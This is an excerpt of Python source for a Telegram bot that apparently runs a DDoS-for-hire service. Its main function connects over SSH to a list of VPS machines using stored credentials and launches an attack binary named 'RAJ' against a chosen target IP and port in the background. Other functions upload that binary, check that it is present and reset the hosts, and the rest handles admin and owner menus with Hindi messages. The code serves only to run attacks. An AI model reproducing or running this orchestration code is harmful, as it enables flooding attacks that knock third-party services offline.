...
def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
    ...
    for index, (ip, details) in enumerate(vps_list, start=1):
        try:
            ...
            check_cmd = "test -f /home/master/freeroot/root/RAJ && echo 'exists' || echo 'missing'"
            status, output = ssh_execute(ip, details['username'], details['password'], check_cmd)
            
            if not status or 'missing' in output:
                logger.error(f"RAJ binary not found on {ip}")
                failed += 1
                continue
                
            # Make executable if not already
            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/freeroot/root/RAJ")
            
            # Execute attack using configured thread count
            attack_cmd = f"nohup /home/master/freeroot/root/RAJ {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
...
def format_user_list(users, title):
    ...
    for i, user in enumerate(users, 1):
        if isinstance(user, dict):  # Regular users
            ...
            # Check if user is in ADMIN_IDS (super admin/owner)
            if user in ADMIN_IDS:
                role = "👑 Owner"
            else:
                role = "🛡️ Admin"
            response += f"{role} {i}. ID: `{user}`\n"
...
def get_menu_markup(user_id):
    ...
    buttons = [
        ...
        KeyboardButton("👑 Admin")  # यह नया बटन सभी यूजर्स को दिखेगा
    ]
...
def check_vps_status(message):
    ...
    for ip, details in vps_data['vps'].items():
        ...
        binary_status = ssh_execute(ip, details['username'], details['password'], "test -f /home/master/freeroot/root/RAJ && echo 1 || echo 0")[1].strip()
...
def show_admins_to_users(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    ...
    # Combine super admins (ADMIN_IDS) and regular admins
    all_admins = ADMIN_IDS.copy()
    all_admins.extend([int(admin_id) for admin_id in admin_data['admins'].keys()])
    
    # Remove duplicates
    all_admins = list(set(all_admins))
    
    response = "👑 *Bot Admins* 👑\n\n"
    response += "यदि आपको कोई सहायता चाहिए, तो नीचे दिए गए एडमिन्स से संपर्क करें:\n\n"
    
    for admin_id in all_admins:
        try:
            # Try to get user info directly instead of chat member info
            user_info = bot.get_chat(admin_id)
            username = f"@{user_info.username}" if user_info.username else "No username"
            first_name = user_info.first_name or "Admin"
            ...
            logger.error(f"Error getting admin info for {admin_id}: {e}")
            # Check if super admin (owner)
            if admin_id in ADMIN_IDS:
                role = "👑 Owner"
            else:
                role = "🛡️ Admin"
            response += f"{role} (ID: {admin_id})\n"
            response += "🚫 Unable to fetch details\n"
            response += "━━━━━━━━━━━━━━━━━━━━━\n"
    
    response += "\n📌 किसी भी सहायता के लिए उपरोक्त एडमिन्स से संपर्क करें।"
...
def list_admins(message):
    ...
    # Separate owners (ADMIN_IDS) and regular admins
    owners = [admin_id for admin_id in admin_data['admins'].keys() if int(admin_id) in ADMIN_IDS]
    regular_admins = [admin_id for admin_id in admin_data['admins'].keys() if int(admin_id) not in ADMIN_IDS]
    
    response = "╔════════════════════════╗\n"
    response += "║     👑 ADMIN ROLES     ║\n"
    response += "╚════════════════════════╝\n\n"
    ...
    if not owners and not regular_admins:
...
def process_binary_upload(message, ip):
    ...
    try:
        ...
        if not file.file_name.startswith('RAJ'):
            raise ValueError("Only RAJ binary files allowed")
        ...
        remote_path = f"/home/master/freeroot/root/RAJ"  # Directly to root as RAJ
...
def process_vps_reset_confirmation(message):
    ...
    for ip, details in vps_data['vps'].items():
        try:
            ...
            # 3. Reinstall attack binary (assuming it's called 'RAJ')
            ssh_execute(ip, details['username'], details['password'], "rm -f ~/home/master/freeroot/root/RAJ")
